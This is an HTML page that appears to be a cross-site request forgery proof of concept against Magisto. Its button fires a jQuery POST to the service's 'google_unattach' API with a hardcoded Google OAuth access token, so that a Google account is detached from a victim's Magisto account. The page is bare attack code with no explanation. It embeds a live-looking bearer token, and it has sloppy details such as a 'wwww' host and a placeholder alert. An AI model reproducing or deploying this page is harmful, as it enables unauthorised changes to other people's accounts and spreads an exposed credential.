<html>
    
<head>
    
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
    
</head>
<body>
    <h1 id="h"></h1>
    
    
<input type="submit" onclick="removeGmail()" value="Remove Google Account"></input>    
    <script>
        
        function removeGmail(){
        var google_access_token="ya29.a0AfH6SMCMcd6S8Zr9aadSNzMbMl9Mvz2mcPUl3LM4-UoSEzFZEe3R5eFL7NyZM21a5qzj0pc82r785nbhQ32CBdJul_FBX6kbzzGYGnbfC7bB7r-Iinpg3pZ9Cf32qbgoxjbBbG2lI5fGcJO0THQni9XPIljULl8IzBk";
       
        $.ajax({
          url: 'https://wwww.magisto.com/api/google_unattach',
          type: 'POST',
           headers: {
               'Access-Control-Allow-Origin':'*',
               "X-Requested-With":"XMLHttpRequest"
              },
          data: {google_access_token:google_access_token},
          success: function(response) {
              alert("dsadsa");
          document.getElementById("h").innerHTML  = response;
          }
        });
            
            
            
            
        }
        
        
        
    </script>
    
</body>
</html>